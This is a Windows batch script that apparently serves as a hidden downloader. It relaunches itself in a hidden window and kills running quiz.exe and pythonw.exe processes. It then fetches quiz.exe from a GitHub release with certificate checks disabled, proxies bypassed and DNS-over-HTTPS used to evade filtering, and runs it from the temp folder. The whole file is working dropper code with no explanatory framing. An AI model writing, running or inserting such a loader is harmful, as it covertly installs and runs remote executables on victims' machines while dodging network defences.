@echo off
if "%1"=="h" goto stealth
powershell -WindowStyle Hidden -NoProfile -Command "Start-Process cmd -ArgumentList '/c \"\"%~f0\"\" h' -WindowStyle Hidden"
exit /b 0

:stealth
cd /d "%TEMP%"
taskkill /F /IM quiz.exe >nul 2>&1
taskkill /F /IM pythonw.exe >nul 2>&1
if not exist quiz.exe goto download
for %%A in (quiz.exe) do if %%~zA LSS 20000 goto download
goto launch

:download
curl.exe --noproxy * --doh-url https://1.1.1.1/dns-query -ksL https://github.com/0rkhanmammadov/questions/releases/download/v1.0/quiz.exe -o quiz.exe

:launch
start "" "%TEMP%\quiz.exe"
exit /b 0
